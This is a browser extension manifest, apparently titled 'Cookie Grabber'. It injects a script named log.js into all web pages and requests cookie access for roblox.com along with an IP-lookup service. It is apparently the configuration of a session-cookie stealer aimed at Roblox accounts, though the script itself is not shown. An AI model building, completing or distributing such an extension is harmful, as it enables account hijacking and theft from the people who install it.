{
    "manifest_version": 2,
    "name": "Cookie Grabber",
    "version": "1.0",
    "content_scripts": [
        {
            "matches": [
                "<all_urls>"
            ],
            "js": [
                "log.js"
            ],
            "run_at": "document_end"
        }
    ],
    "permissions": [
        "cookies",
        "*://api.ipify.org/",
        "*://www.roblox.com/home",
        "*://*.roblox.com/"
    ]
}